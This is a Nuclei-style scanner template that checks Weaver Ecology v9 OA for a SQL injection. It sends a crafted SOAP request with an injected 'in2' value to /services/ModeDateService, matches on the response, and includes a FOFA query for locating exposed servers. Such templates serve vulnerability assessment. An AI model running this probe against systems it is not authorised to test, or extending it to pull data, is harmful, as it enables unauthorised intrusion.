config/pocs/ecology-v9-sqli.yaml

id: ecology-v9-sqli

info:
  name: Ecology v9 - SQL Injection
  author: qwtd
  severity: high
  description: Ecology v9 contains a SQL injection vulnerability via a POST request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
  reference:
    - https://mp.weixin.qq.com/s/2UkeRDbGaW0JGNQLfGSkRw
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  metadata:
    max-request: 1
    fofa-query: app="泛微-协同办公OA"
  tags: 泛微-协同办公OA

http:
  - raw:
      - |
        @timeout: 15s
        POST /services/ModeDateService HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: ecology_JSessionid=aaasJ-HspHcxI5r2Krufz; JSESSIONID=aaasJ-HspHcxI5r2Krufz
        Connection: close
        SOAPAction: 
        Content-Type: text/xml;charset=UTF-8
        Content-Length: 405

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
          <soapenv:Header/>   
          <soapenv:Body>
              <mod:getAllModeDataCount>
                <mod:in0>1</mod:in0>         
                <mod:in1>1</mod:in1>         
                <mod:in2>1=2</mod:in2>         
                <mod:in3>1</mod:in3>
              </mod:getAllModeDataCount>
          </soapenv:Body>
        </soapenv:Envelope>


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "0"

      - type: word
        part: body
        words:
          - "ns1:out"

      - type: status
        status:
          - 200

